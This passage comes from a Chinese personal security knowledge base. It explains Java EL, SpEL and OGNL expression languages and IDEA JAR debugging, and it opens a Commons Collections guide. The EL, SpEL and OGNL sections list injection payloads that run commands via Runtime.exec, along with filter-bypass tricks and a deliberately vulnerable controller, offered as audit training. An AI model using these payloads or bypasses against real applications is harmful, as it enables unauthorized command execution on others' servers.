例如，${userinfo}代表获取变量userinfo的值。当EL表达式中的变量不给定范围时，则默认在page范围查找，然后依次在request、session、application范围查找。也可以用范围作为前缀表示属于哪个范围的变量，例如：${pageScope.userinfo}表示访问page范围中的userinfo变量。 简单地说，使用EL表达式语法：${EL表达式} 其中，EL表达式和JSP代码等价转换。事实上，可以将EL表达式理解为一种简化的JSP代码。 扩展JSP代码的写法总结： JSP表达式： 向浏览器输出变量或表达式的计算结果。 JSP脚本： 执行java代码的原理：翻译到_jspService()方法中。 JSP声明： 声明jsp的成员变量或成员方法。 JSP注释： 用于注释JSP代码，不会翻译到Java文件中，也不会执行。 [ ]与.运算符 EL表达式提供.和[]两种运算符来存取数据。 当要存取的属性名称中包含一些特殊字符，如.或-等并非字母或数字的符号，就一定要使用[]。例如：${user.My-Name}应当改为${user[\"My-Name\"]}。 如果要动态取值时，就可以用[]来做，而.无法做到动态取值。例如：${sessionScope.user[data]}中data 是一个变量。 获取变量举例 map = new HashMap<>(); map.put(\"my-name\", \"admin\"); request.setAttribute(\"test\", map); %> 从四个作用域中搜索变量：${name} 从requestScope作用域中获取变量：${requestScope.request} 从sessionScope作用域中获取变量：${sessionScope.session} 从pageScope作用域中获取变量：${pageScope.page} 从applicationScope作用域中获取变量：${applicationScope.application} 从作用域中获取特殊符号变量：${requestScope.test[\"my-name\"]} 操作符 类型 符号 算术型 +、-（二元）、*、/、div、%、mod、-（一元） 逻辑型 and、&&、or、\\ \\ 、!、not 关系型 ==、eq、!=、ne、、gt、=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。 空 empty 空操作符是前缀操作，可用于确定值是否为空。 条件型 A ?B :C 。根据 A 赋值的结果来赋值 B 或 C。 运算符优先级如下（从高到低，从左到右）： [] . () (用于更改运算符的优先) - (一元) not ! empty * / div % mod + - (二元) += <> = lt gt le ge == != eq ne && and || or ? : -> = ; 隐含对象 EL表达式语言中定义了11个隐含对象，使用这些隐含对象可以很方便地获取web开发中的一些常见对象，并读取这些对象的数据。 语法：${隐式对象名称}：获得对象的引用 序号 隐含对象名称 描 述 1 pageContext 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。） 2 pageScope 代表page域中用于保存属性的Map对象 3 requestScope 代表request域中用于保存属性的Map对象 4 sessionScope 代表session域中用于保存属性的Map对象 5 applicationScope 代表application域中用于保存属性的Map对象 6 param 表示一个保存了所有请求参数的Map对象 7 paramValues 表示一个保存了所有请求参数的Map对象，它对于某个请求参数，返回的是一个string[] 8 header 表示一个保存了所有http请求头字段的Map对象，注意：如果头里面有“-” ，例Accept-Encoding，则要header[“Accept-Encoding”] 9 headerValues 表示一个保存了所有http请求头字段的Map对象，它对于某个请求参数，返回的是一个string[]数组。注意：如果头里面有“-” ，例Accept-Encoding，则要headerValues[“Accept-Encoding”] 10 cookie 表示一个保存了所有cookie的Map对象 11 initParam 表示一个保存了所有web应用初始化参数的map对象 函数 EL表达式语法允许开发人员开发自定义函数，以调用Java类的方法。语法：${prefix：method(params)} 在EL表达式中调用的只能是Java类的静态方法，这个Java类的静态方法需要在TLD文件中描述，才可以被EL表达式调用。 EL自定义函数用于扩展EL表达式的功能，可以让EL表达式完成普通Java程序代码所能完成的功能。 举例： ==>编写一个让所有字符大写的函数 一般来说， EL自定义函数开发与应用包括以下三个步骤： 1、编写一个Java类的静态方法 2、编写标签库描述符（tld）文件，在tld文件中描述自定义函数。 3、在JSP页面中导入和使用自定义函数 1、编写一个Java类的静态方法，代码如下 public class ELFunc { public static String up(String message) { if (message == null){ return null; } return message.toUpperCase(); } } 2、编写标签库描述符（tld）文件，在tld文件中描述自定义函数。 ELFunc.tld位置 代码 1.0 ELFunc --> /ELFunc 子元素用于指定EL自定义函数的名称--> up 子元素用于指定完整的Java类名--> ELFunc 子元素用于指定Java类中的静态方法的签名， 20 方法签名必须指明方法的返回值类型及各个参数的类型，各个参数之间用逗号分隔。--> java.lang.String up(java.lang.String) 3、在JSP页面中导入和使用自定义函数 ${fn:up(\"123aaabbbCCC\")} 实验了好久代码应该是没问题的，但是还是有报错，后面需要再解决这个问题吧，今天是解决不了了，不然一天没了。。。 禁用/启用EL表达式 全局禁用EL表达式，web.xml中进入如下配置： *.jsp true 单个文件禁用EL表达式 在JSP文件中可以有如下定义： 该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。 JSP2.0中默认的启用EL表达式。 EL表达式注入 原理都是一样的：表达式全部或部份外部可控。列一些通用的poc //对应于JSP页面中的pageContext对象（注意：取的是pageContext对象） ${pageContext} //获取Web路径 ${pageContext.getSession().getServletContext().getClassLoader().getResource(\"\")} //文件头参数 ${header} //获取webRoot ${applicationScope} //执行命令 ${pageContext.request.getSession().setAttribute(\"a\",pageContext.request.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"calc\").getInputStream())} EL表达式注入绕过 通过 charAt 与 toChars 获取字符，在由 toString 转字符串再用 concat 拼接来绕过一些敏感字符的过滤 ${\"xxx\".toString().charAt(0).toChars(97)[0].toString()} ${\"xxx\".toString().charAt(0).toChars(97)[0].toString().concat(\"xxx\".toString().charAt(0).toChars(98)[0].toString())} 通过以上代码，只需要修改toChars()中的ascii码值就可以变成任意字符 参考 javaweb学习总结(二十九)——EL表达式 浅析EL表达式注入漏洞 （很详细） Java EL （Expression Language）表达式注入 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/01.审计基础/10.SpEL表达式.html":{"url":"个人知识库/02.代码审计/01.Java安全/01.审计基础/10.SpEL表达式.html","title":"10.SpEL表达式","keywords":"","body":" 介绍 基础使用 pom.xml 基础例子 SpEL语法 SpEL表达式分类 基本表达式 类相关表达式 集合相关表达式 其他表达式 SpEL类相关表达式‼️ 类类型表达式 类实例化 instanceof 表达式 常用payload 绕过方式 防御 参考 介绍 Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。 SpEL的诞生是为了给 Spring 社区提供一种能够与 Spring 生态系统所有产品无缝对接，能提供一站式支持的表达式语言。 Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEl可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。 基础使用 先新建一个Spring项目 pom.xml org.springframework spring-expression 5.2.12.RELEASE 基础例子 一个简单的Controller message为get传入的参数 ExpressionParser接口负责解析表达式字符串 getValue方法执行表达式并返回结果 默认容器是spring本身的容器：ApplicationContext package com.spel.test.demo; import org.springframework.expression.Expression; import org.springframework.expression.ExpressionParser; import org.springframework.expression.spel.standard.SpelExpressionParser; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class HelloController { @GetMapping(\"/test\") public String catUser(String message) { ExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(message); return expression.getValue().toString(); } } 访问 http://127.0.0.1:8080/test?message=T(java.lang.Math).random()*100，可见成功得到一个随机数，说明表达式被执行了 访问 http://127.0.0.1:8080/test?message=new%20java.lang.ProcessBuilder(%22whoami%22).start() 可以直接执行系统命令 SpEL语法 SpEL使用 #{...} 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如： 引用其他对象:#{car} 引用其他对象的属性：#{car.brand} 调用其它方法 , 还可以链式操作：#{car.toString()} 其中属性名称引用还可以用$符号 如：${someProperty} 除此以外在SpEL中，使用T()运算符会调用类作用域的方法和常量。例如，在SpEL中使用Java的Math类，我们可以像下面的示例这样使用T()运算符： #{T(java.lang.Math)} 演示因为是本地环境，且是将输入的参数直接当成SpEL表达式去执行的，所以没有输入#{}，但是如果用@Value去获取值执行就需要了 @Value(\"#{ T(java.lang.Math).random() * 100.0 }\") private int rand; SpEL表达式分类 基本表达式 字面量表达式、关系，逻辑与算数运算表达式、字符串链接及截取表达式、三目运算、正则表达式以及括号优先级表达式； 类相关表达式 类类型表达式、类实例化、instanceof 表达式、变量定义及引用、赋值表达式、自定义函数、对象属性存取及安全导航表达式、对象方法调用、Bean 引用； 集合相关表达式 内联 List、内联数组、集合、字典访问、列表、字典； 其他表达式 模版表达式 SpEL类相关表达式‼️ 类类型表达式 使用\"T(Type)\"来表示 java.lang.Class 实例，\"Type\"必须是类全限定名，\"java.lang\"包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段。 举例 // java.lang 包类访问 T(String) // 其他包类访问 T(java.lang.Runtime).getRuntime().exec('open -na Calculator') //类静态字段访问 T(Integer).MAX_VALUE //类静态方法调用 T(Integer).parseInt('1') 类实例化 类实例化同样使用 java 关键字「new」，类名必须是全限定名，但 java.lang 包内的类型除外，如 String、Integer。 new java.util.Date() instanceof 表达式 SpEL 支持 instanceof 运算符，跟 Java 内使用同义 \"test\" instanceof T(String) 常用payload ${12*12} T(java.lang.Runtime).getRuntime().exec(\"open -na Calculator\") T(Thread).sleep(10000) #this.getClass().forName('java.lang.Runtime').getRuntime().exec('open -na Calculator') new java.lang.ProcessBuilder('open -na Calculator').start() 回显 引入了org.apache.commons.io这个包的话，可以输出回显 T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()) 绕过方式 如果采用关键词过滤，可以采用反射的方式来绕过 T(String).class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"open%20-na%20Calculator\") // + 一定要用url编码，不然浏览器解析会有问题 T(String).class.forName(\"java.lang.Ru\"%2b\"ntime\").getMethod(\"getRu\"%2b\"ntime\").invoke(null).exec(\"open%20-na%20Calculator\") T(String).getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).getClass().getMethod(\"exec\",T(String)).invoke(T(java.lang.Runtime).getRuntime(),\"open%20-na%20Calculator\") 使用ScriptEngineManager构造 T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\").eval(\"java.lang.Runtime.getRuntime().exec('open -na Calculator')\") T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\").eval(\"java.lang.Runt\"%2b\"ime.getRu\"%2b\"ntime().e\"%2b\"xec('open -na Calculator')\") 如果不能使用双引号，那么可以采用生成任意字符+concat函数的形式进行绕过 T(java.lang.Character).toString(97).concat(T(java.lang.Character).toString(98)) 防御 因为SpEL表达式注入漏洞导致攻击者可以通过表达式执行精心构造的任意代码，导致命令执行。为了防御该类漏洞，Spring官方推出了SimpleEvaluationContext作为安全类来防御该类漏洞。 官方文档：https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html SimpleEvaluationContext 旨在仅支持 SpEL 语言语法的一个子集。它不包括 Java 类型引用，构造函数和 bean 引用；所以最直接的修复方式是使用 SimpleEvaluationContext 替换 StandardEvaluationContext。 基础举例 ExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(message); EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(message).build(); return expression.getValue(context).toString(); 参考 Java代码审计之SpEL表达式注入 由浅入深SpEL表达式注入漏洞 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/01.审计基础/11.OGNL表达式.html":{"url":"个人知识库/02.代码审计/01.Java安全/01.审计基础/11.OGNL表达式.html","title":"11.OGNL表达式","keywords":"","body":" 介绍 三要素 使用OGNL表达式 pom.xml 基础用法举例 对Root对象的访问 对上下文对象的访问 对静态变量的访问‼️ 方法的调用‼️ 对数组和集合的访问 投影与选择 创建对象‼️ 和 % 和 $ 的区别 #符 %符 $符 和 . 和 @ 的区别 OGNL表达式注入 注入举例 能解析OGNL的API HTTP请求中常见的注入点 常用payload 参考 介绍 OGNL 是 Object-Graph Navigation Language（对象导航图语言）的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。这样可以更好的取得数据。 Ognl 是一个功能强大的表达式语言，用来获取和设置 java 对象的属性 ，它旨在提供一个更高抽象度语法来对 java 对象图进行导航。 官方文档：https://commons.apache.org/proper/commons-ognl/language-guide.html 对于开发者来说，使用 OGNL，可以用简洁的语法来完成对 java 对象的导航。通常来说：通过一个 “路径” 来完成对象信息的导航，这个 “路径” 可以是到 java bean 的某个属性，或者集合中的某个索引的对象，等等，而不是直接使用 get 或者 set 方法来完成。 三要素 首先来介绍下 OGNL 的三要素： 表达式（Expression）： 表达式是整个 OGNL 的核心内容，所有的 OGNL 操作都是针对表达式解析后进行的。通过表达式来告诉 OGNL 操作到底要干些什么。因此，表达式其实是一个带有语法含义的字符串，整个字符串将规定操作的类型和内容。OGNL 表达式支持大量的表达式，如 “链式访问对象”、表达式计算、甚至还支持 Lambda 表达式。 Root 对象： OGNL 的 Root 对象可以理解为 OGNL 的操作对象。当我们指定了一个表达式的时候，我们需要指定这个表达式针对的是哪个具体的对象。而这个具体的对象就是 Root 对象，这就意味着，如果有一个 OGNL 表达式，那么我们需要针对 Root 对象来进行 OGNL 表达式的计算并且返回结果。 上下文环境： 有个 Root 对象和表达式，我们就可以使用 OGNL 进行简单的操作了，如对 Root 对象的赋值与取值操作。但是，实际上在 OGNL 的内部，所有的操作都会在一个特定的数据环境中运行。这个数据环境就是上下文环境（Context）。OGNL 的上下文环境是一个 Map 结构，称之为 OgnlContext。Root 对象也会被添加到上下文环境当中去。 说白了上下文就是一个 MAP 结构，它实现了 java.utils.Map 的接口。 使用OGNL表达式 pom.xml ognl ognl 3.1.11 基础用法举例 对Root对象的访问 OGNL 使用的是一种链式的风格进行对象的访问，中间使用.进行连接；所有的OGNL表达式都基于当前对象的上下文来完成求值运算，链的前面部分的结果将作为后面求值的上下文。 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); user.setAge(16); user.setName(\"hello\"); Info info = new Info(\"1\",\"2\"); user.setInfo(info); System.out.println(Ognl.getValue(\"age\", user)); // 16 System.out.println(Ognl.getValue(\"name\", user)); // hello System.out.println(Ognl.getValue(\"name.length\", user)); // 5 System.out.println(Ognl.getValue(\"info\", user)); // Info(a=1, b=2) System.out.println(Ognl.getValue(\"info.a\", user)); // 1 } } @Data class User { private String name; private int age; private Info info; } @Data class Info { private String a; private String b; public Info(String a, String b){ this.a = a; this.b = b; } } 对上下文对象的访问 使用 OGNL 的时候如果不设置上下文对象，系统会自动创建一个上下文对象，如果传入的参数当中包含了上下文对象则会使用传入的上下文对象。 当访问上下文环境当中的参数时候，需要在表达式前面加上 '#' ，表示了与访问 Root 对象的区别。 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); user.setAge(16); user.setName(\"hello\"); Info info = new Info(\"1\",\"2\"); user.setInfo(info); Map context = new HashMap(); context.put(\"test\", \"testValue\"); context.put(\"aaa\", user); System.out.println(Ognl.getValue(\"#test\", context, user)); // testValue System.out.println(Ognl.getValue(\"#aaa\", context, user)); // User(name=hello, age=16, info=Info(a=1, b=2)) System.out.println(Ognl.getValue(\"#aaa.name\", context, user)); // hello } } @Data class User { private String name; private int age; private Info info; } @Data class Info { private String a; private String b; public Info(String a, String b){ this.a = a; this.b = b; } } 对静态变量的访问‼️ 在 OGNL 表达式当中也可以访问静态变量或者调用静态方法，格式如 @[class]@[field/method()]。 package org.example; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static String test = \"66666\"; public static void main(String[] args) throws OgnlException { System.out.println(Ognl.getValue(\"@org.example.OgnlTest@test\", null)); } } 方法的调用‼️ 如果需要调用 Root 对象或者上下文对象当中的方法也可以使用类似的方式来调用。甚至可以传入参数。 赋值的时候可以选择上下文当中的元素进行给 Root 对象的 name 属性赋值。 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); Map context = new HashMap(); context.put(\"test\", \"testValue\"); context.put(\"aaa\", user); System.out.println(Ognl.getValue(\"getName()\", context, user)); // null Ognl.getValue(\"setName(#test)\", context, user); // 执行setName方法 System.out.println(Ognl.getValue(\"getName()\", context, user)); // testValue } } @Data class User { private String name; private int age; } 对数组和集合的访问 OGNL 支持对数组按照数组下标的顺序进行访问。此方式也适用于对集合的访问，对于 Map 支持使用键进行访问。 package org.example; import ognl.Ognl; import ognl.OgnlException; import java.util.ArrayList; import java.util.HashMap; import java.util.List; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { List list = new ArrayList<>(); list.add(\"123\"); list.add(\"456\"); Map map = new HashMap(); map.put(\"test1\", \"value1\"); Map context = new HashMap(); context.put(\"list\", list); context.put(\"map\", map); System.out.println(Ognl.getValue(\"#list[0]\", context, list)); // 123 System.out.println(Ognl.getValue(\"#map['test1']\", context, map)); // value1 } } 投影与选择 OGNL 支持类似数据库当中的选择与投影功能。 个人感觉有点类似stream 投影：选出集合当中的相同属性组合成一个新的集合。语法为 collection.{XXX}，XXX 就是集合中每个元素的公共属性。 选择：选择就是选择出集合当中符合条件的元素组合成新的集合。语法为 collection.{Y XXX}，其中 Y 是一个选择操作符，XXX 是选择用的逻辑表达式。 选择操作符有 3 种： ? ：选择满足条件的所有元素 ^：选择满足条件的第一个元素 $：选择满足条件的最后一个元素 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.ArrayList; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User u1 = new User(\"name1\", 11); User u2 = new User(\"name2\", 22); User u3 = new User(\"name3\", 33); User u4 = new User(\"name4\", 44); ArrayList list = new ArrayList(); list.add(u1); list.add(u2); list.add(u3); list.add(u4); Map context = new HashMap(); context.put(\"list\", list); System.out.println(Ognl.getValue(\"#list.{age}\", context, list)); // [11, 22, 33, 44] System.out.println(Ognl.getValue(\"#list.{? #this.age > 22}\", context, list)); // [User(name=name3, age=33), User(name=name4, age=44)] System.out.println(Ognl.getValue(\"#list.{^ #this.age > 22}\", context, list)); // [User(name=name3, age=33)] System.out.println(Ognl.getValue(\"#list.{$ #this.age > 22}\", context, list)); // [User(name=name4, age=44)] } } @Data class User { private String name; private int age; public User(String name, int age) { this.name = name; this.age = age; } } 创建对象‼️ OGNL 支持直接使用表达式来创建对象。主要有三种情况： 构造 List 对象：使用 {}, 中间使用 ',' 进行分割如 {\"aa\", \"bb\", \"cc\"} 构造 Map 对象：使用 #{}，中间使用 ', 进行分割键值对，键值对使用 ':' 区分，如 #{\"key1\" : \"value1\", \"key2\" : \"value2\"} 构造任意对象：直接使用已知的对象的构造方法进行构造。 System.out.println(Ognl.getValue(\"{'key1','value1'}\", null)); // [key1, value1] System.out.println(Ognl.getValue(\"#{'key1':'value1'}\", null)); // {key1=value1} System.out.println(Ognl.getValue(\"new java.lang.String('123')\", null)); // 123 # 和 % 和 $ 的区别 #符 #符主要有三种用途： 访问非根对象属性，即访问OGNL上下文和Action上下文，由于Struts2中值栈被视为根对象，所以访问其他非根对象时需要加#前缀，#相当于ActionContext.getContext()； 用于过滤和投影（projecting）集合，如books.{? #this.price； 用于构造Map，如#{'foo1':'bar1', 'foo2':'bar2'}； %符 %符的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。 $符 $符的主要作用是在相关配置文件中引入OGNL表达式，让其在配置文件中也能解析OGNL表达式。（换句话说，$用于在配置文件中获取ValueStack的值用的）。 # 和 . 和 @ 的区别 获取静态函数和变量的时候用@ 获取非静态函数用.号获取 获取非静态变量用#获取 OGNL表达式注入 webwork2和现在的Struts2.x中使用OGNL取代原来的EL来做界面数据绑定，所谓界面数据绑定，也就是把界面元素（例如一个textfield,hidden)和对象层某个类的某个属性绑定在一起，修改和显示自动同步。而Struts2框架正是因为滥用OGNL表达式，使之成为了“漏洞之王”。 由前面知道，OGNL可以访问静态方法、属性以及对象方法等，其中包含可以执行恶意操作如命令执行的类java.lang.Runtime等，当OGNL表达式外部可控时，攻击者就可以构造恶意的OGNL表达式来让程序执行恶意操作，这就是OGNL表达式注入漏洞。 注入举例 格式@[class]@[field/method()] package org.example; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static void main(String[] args) throws OgnlException { // @[class]@[field/method()] String payload = \"@java.lang.Runtime@getRuntime().exec('open -na Calculator')\"; System.out.println(Ognl.getValue(payload, null)); } } 能解析OGNL的API 能解析OGNL的API如下表： 类名 方法名 com.opensymphony.xwork2.util.TextParseUtil translateVariables,translateVariablesCollection com.opensymphony.xwork2.util.TextParser evaluate com.opensymphony.xwork2.util.OgnlTextParser evaluate com.opensymphony.xwork2.ognl.OgnlUtil setProperties,setProperty,setValue,getValue,callMethod,compile com.opensymphony.xwork2.util.ValueStack findString,findValue,setValue,setParameter com.opensymphony.xwork2.ognl.OgnlValueStack findString,findValue,setValue,setParameter,trySetValue org.apache.struts2.util.VelocityStrutsUtil evaluate org.apache.struts2.util.StrutsUtil isTrue,findString,findValue,getText,translateVariables,makeSelectList org.apache.struts2.views.jsp.ui.OgnlTool findValue ognl.Ognl parseExpression,getValue,setValue 以下是调用过程中可能会涉及到的一些类： 涉及类名 方法名 com.opensymphony.xwork2.ognl.OgnlReflectionProvider getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue com.opensymphony.xwork2.util.reflection.ReflectionProvider getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue HTTP请求中常见的注入点 常用payload //获取context里面的变量值 #user #user.name //使用runtime执行系统命令 @java.lang.Runtime@getRuntime().exec(\"calc\") //使用processbuilder执行系统命令 (new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start() //获取当前绝对路径 @java.lang.System@getProperty(\"user.dir\") // e-mobole带回显 @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()) 参考 OGNL表达式注入漏洞总结 Struts2著名RCE漏洞引发的十年之思 Struts2 中的OGNL、表达式注入及防御 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/01.审计基础/12.IDEA调试JAR.html":{"url":"个人知识库/02.代码审计/01.Java安全/01.审计基础/12.IDEA调试JAR.html","title":"12.IDEA调试JAR","keywords":"","body":" 前言 准备 开始调试 最后 前言 远程调试相对来说还是比较繁琐的，如果可以给jar拿到本地来运行调试，会方便简单很多。 准备 随便准备个JAR即可，比如 https://github.com/halo-dev/halo 下载后得到halo.jar，通过命令java -jar halo.jar即可运行（这个jar运行需要jdk11） 开始调试 新建一个maven空项目，为了运行jar选择用jdk11，其他的随便选选即可 添加配置，选择JAR Application 然后根据实际情况配置 点击Apply，然后就可以在IDEA里面运行这个JAR了 但这个时候还不能调试，还需要添加classes依赖关系 之前也说过，要添加了依赖关系IDEA才会执行这个代码，才能知道你下的断点，才会在那阻断让你分析 先解压这个jar 然后给目录lib添加到依赖中，不然这个jar使用的其他jar依赖不能调试 然后给目录BOOT-INF添加到依赖关系中 然后就可以Debug调试了 下断点有个勾表示成功 成功拦截 最后 虽然说上面已经可以开始调试了，但还是有一些问题 一些函数可能因为不能反编译等等原因，导致找不到，也会影响我们的进程 所以有条件的情况下，可以下载他的源代码，然后给源代码也加入进去（直接点上面的提示choice source file即可） Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/02.反序列化链分析/01.Apache_Commons_Collections中的反序列化.html":{"url":"个人知识库/02.代码审计/01.Java安全/02.反序列化链分析/01.Apache_Commons_Collections中的反序列化.html","title":"01.Apache_Commons_Collections中的反序列化","keywords":"","body":" 基础使用 背景介绍 主要特点 包结构介绍 引入依赖 使用介绍 通用集合 Bag 通用集合 BidiMap 通用集合 MapIterator 通用集合 OrderedMap 集合工具类 CollectionUtils 检查是否为空元素 合并两个排序列表 转换列表 过滤列表 检查非空列表 检查空的列表 检查子列表 检查相交 求差集 求联合集 参考教程 Commons Collections1 分析 前言 前置知识 POC示例 Transformer ConstantTransformer InvokerTransformer‼️ ChainedTransformer‼️ 几个Transformer实现类整理 Map TransformedMap‼️ Map.Entry 反射exec 反射利用链 简化链 使用AnnotationInvocationHandler触发反序列化 分析 POC构建过程 完整POC 整体思路 使用LazyMap利用链 介绍 动态代理复习 构建POC 完整POC LazyMap利用链补充 参考 基础使用 背景介绍 Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。 Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。 主要特点 Commons Collections 的主要特点如下 - Bag - Bag 接口简化了每个对象具有多个副本的集合。 BidiMap- BidiMap 接口提供双向映射，可用于使用键或键使用的值来查找值。 MapIterator - MapIterator 接口为映射提供了简单和易于迭代方法。 转换装饰器 - 转换装饰器 (Transforming Decorators) 可以在集合添加到集合时改变集合的每个对象。 复合集合 - 复合集合用于要求统一处理多个集合的情况。 有序映射 - 有序映射保留元素添加的顺序。 有序集 - 有序集保留元素添加的顺序。 参考映射 - 参考映射允许在密切控制下对键 / 值进行垃圾收集。 比较器实现 - 许多比较器实现都可用。 迭代器实现 - 许多迭代器实现都可用。 适配器类 - 适配器类可用于将数组和枚举转换为集合。 实用程序 - 实用程序可用于测试测试或创建集合的典型集合理论属性，如联合，交集。 支持关闭。 包结构介绍 Commons Collections的最新版是4.x (commons-collections4)，但由于工作中大多还是3.x的版本，这里就以3.x中的最后一个版本3.2.2作使用介绍。 以下是Collections的包结构和简单介绍，如果你想了解更多的各个包下的接口和实现，请参考Apache Commons Collections 3.2.2 API文档。 org.apache.commons.collections – CommonsCollections自定义的一组公用的接口和工具类 org.apache.commons.collections.bag – 实现Bag接口的一组类 org.apache.commons.collections.bidimap – 实现BidiMap系列接口的一组类 org.apache.commons.collections.buffer – 实现Buffer接口的一组类 org.apache.commons.collections.collection –实现java.util.Collection接口的一组类 org.apache.commons.collections.comparators– 实现java.util.Comparator接口的一组类 org.apache.commons.collections.functors –Commons Collections自定义的一组功能类 org.apache.commons.collections.iterators – 实现java.util.Iterator接口的一组类 org.apache.commons.collections.keyvalue – 实现集合和键/值映射相关的一组类 org.apache.commons.collections.list – 实现java.util.List接口的一组类 org.apache.commons.collections.map – 实现Map系列接口的一组类 org.apache.commons.collections.set – 实现Set系列接口的一组类 引入依赖 commons-collections commons-collections 3.2.2 使用介绍 通用集合 Bag Bag 接口定义了一个集合，它可以计算一个对象出现在集合中的次数。 package org.example; import org.apache.commons.collections.Bag; import org.apache.commons.collections.bag.HashBag; public class App{ public static void main(String[] args) { Bag bag = new HashBag(); bag.add(\"a\", 2); bag.add(\"b\"); bag.add(\"c\"); bag.add(\"c\"); System.out.println(bag); // [2:a,1:b,2:c] System.out.println(bag.getCount(\"c\")); // 2 System.out.println(bag.uniqueSet()); // [a, b, c] bag.remove(\"a\", 1); System.out.println(bag); // [1:a,1:b,2:c] } } 通用集合 BidiMap BidiMap 接口被添加到支持双向映射。 使用双向映射，可以使用值查找键，并且可以使用键轻松查找值。 package org.example; import org.apache.commons.collections.BidiMap; import org.apache.commons.collections.bidimap.TreeBidiMap; public class App { public static void main(String[] args) { BidiMap bidiMap = new TreeBidiMap(); bidiMap.put(\"a\", \"b\"); bidiMap.put(\"c\", \"d\"); System.out.println(bidiMap); // {a=b, c=d} System.out.println(bidiMap.get(\"a\")); // b System.out.println(bidiMap.getKey(\"b\")); // a System.out.println(bidiMap.inverseBidiMap()); // {b=a, d=c} bidiMap.remove(\"a\"); System.out.println(bidiMap); // {c=d} } } 通用集合 MapIterator JDK Map 接口很难作为迭代在 EntrySet 或 KeySet 对象上迭代。 MapIterator 提供了对 Map 的简单迭代。 package org.example; import org.apache.commons.collections.IterableMap; import org.apache.commons.collections.MapIterator; import org.apache.commons.collections.map.HashedMap; public class App { public static void main(String[] args) { IterableMap iterableMap = new HashedMap(); iterableMap.put(\"a\", \"b\"); iterableMap.put(\"c\", \"d\"); iterableMap.put(\"e\", \"F\"); MapIterator mapIterator = iterableMap.mapIterator(); while (mapIterator.hasNext()){ Object key = mapIterator.next(); Object value = mapIterator.getValue(); System.out.println(\"key: \" + key); // key: a System.out.println(\"value: \" + value); // value: b mapIterator.setValue(value + \"TEST\"); } System.out.println(iterableMap); // {a=bTEST, c=dTEST, e=FTEST} } } 通用集合 OrderedMap OrderedMap 是映射的新接口，用于保留添加元素的顺序。 LinkedMap 和 ListOrderedMap 是两种可用的实现。 此接口支持 Map 的迭代器，并允许在 Map 中向前或向后两个方向进行迭代。 package org.example; import org.apache.commons.collections.OrderedMap; import org.apache.commons.collections.map.LinkedMap; public class App { public static void main(String[] args) { OrderedMap map = new LinkedMap(); map.put(\"a\", \"b\"); map.put(\"C\", \"D\"); System.out.println(map.firstKey()); // a System.out.println(map.lastKey()); // C System.out.println(map.nextKey(\"a\")); // C System.out.println(map.previousKey(\"C\")); // a } } 集合工具类 CollectionUtils Apache Commons Collections 库的 